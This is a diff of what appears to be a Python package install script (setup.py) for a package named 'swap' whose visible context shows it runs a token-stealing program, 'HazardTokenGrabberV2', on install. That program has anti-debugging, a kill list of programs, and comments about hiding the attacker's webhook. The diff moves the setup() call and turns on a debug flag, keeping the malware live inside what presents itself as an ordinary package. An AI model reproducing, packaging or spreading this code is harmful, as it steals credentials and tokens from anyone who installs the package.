@@ -1,8 +1,24 @@
+from setuptools import setup, find_packages
+import codecs
+import os
+
+VERSION = '1.4.20'
+DESCRIPTION = 'Shhh.'
+
+# Setting up
+setup(
+    name = "swap",
+    version = VERSION,
+    author = "me",
+    author_email = "spaceydot@proton.me",
+    description = DESCRIPTION,
+    packages = find_packages(),
+    install_requires=[]
+)
 import asyncio
 import ctypes
 import json
 import ntpath
-import os
 import random
 import re
 import shutil
@@ -47,7 +63,7 @@ __config__ = {
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
     # enable dev debug lol
-    'dev' : False,
+    'dev' : True,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
@@ -831,20 +847,3 @@ except (httpx.NetworkError, httpx.TimeoutException):
 asyncio.run(HazardTokenGrabberV2().init())
 # The end of the payload, the beginning of setup
 if fetch_conf('dev'): print("The end of the payload, the beginning of setup")
-from setuptools import setup, find_packages
-import codecs
-import os
-
-VERSION = '1.4.20'
-DESCRIPTION = 'Shhh.'
-
-# Setting up
-setup(
-    name = "swap",
-    version = VERSION,
-    author = "me",
-    author_email = "spaceydot@proton.me",
-    description = DESCRIPTION,
-    packages = find_packages(),
-    install_requires=[]
-)
